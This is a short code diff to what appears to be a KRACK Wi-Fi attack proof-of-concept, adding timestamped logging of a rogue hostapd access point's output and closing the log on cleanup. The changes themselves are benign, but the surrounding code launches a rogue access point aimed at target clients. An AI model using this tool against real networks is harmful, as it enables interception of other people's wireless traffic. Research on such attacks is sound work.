@@ -433,6 +433,7 @@ class KRAckAttack():
 		self.apmac = None
 		self.netconfig = None
 		self.hostapd = None
+		self.hostapd_log = None
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
@@ -765,6 +766,7 @@ class KRAckAttack():
 			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
 		else:
 			log(ALL, "Rogue hostapd: " + line.strip().decode())
+		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())
 
 	def configure_interfaces(self):
 		# 0. Warn about common mistakes
@@ -841,7 +843,8 @@ class KRAckAttack():
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
 		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-
+		self.hostapd_log = open("hostapd_rogue.log", "w")
+		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
 
@@ -899,6 +902,8 @@ class KRAckAttack():
 		if self.hostapd:
 			self.hostapd.terminate()
 			self.hostapd.wait()
+		if self.hostapd_log:
+			self.hostapd_log.close()
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
